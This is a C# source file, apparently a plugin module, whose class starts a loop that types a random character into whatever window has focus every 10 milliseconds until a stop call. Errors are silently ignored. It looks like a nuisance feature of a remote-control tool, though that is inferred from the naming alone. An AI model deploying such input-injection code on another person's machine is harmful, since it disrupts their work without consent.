using System;
using System.Threading;
using System.Windows.Forms;

namespace Plugin.Handler;

internal class HandleKeyBoard
{
	public static CancellationTokenSource ctsStop;

	public static Random random = new Random();

	public static void Start()
	{
		if (ctsStop == null || ctsStop.IsCancellationRequested)
		{
			ctsStop = new CancellationTokenSource();
			while (!ctsStop.IsCancellationRequested)
			{
				Thread thread = new Thread(SendRandomText);
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
				thread.Join();
			}
		}
	}

	private static void SendRandomText()
	{
		try
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+<>?;:\"[]{}\\/";
			SendKeys.SendWait(text[random.Next(text.Length)].ToString());
			Thread.Sleep(10);
		}
		catch
		{
		}
	}

	public static void Stop()
	{
		if (ctsStop != null && !ctsStop.IsCancellationRequested)
		{
			ctsStop.Cancel();
		}
	}
}
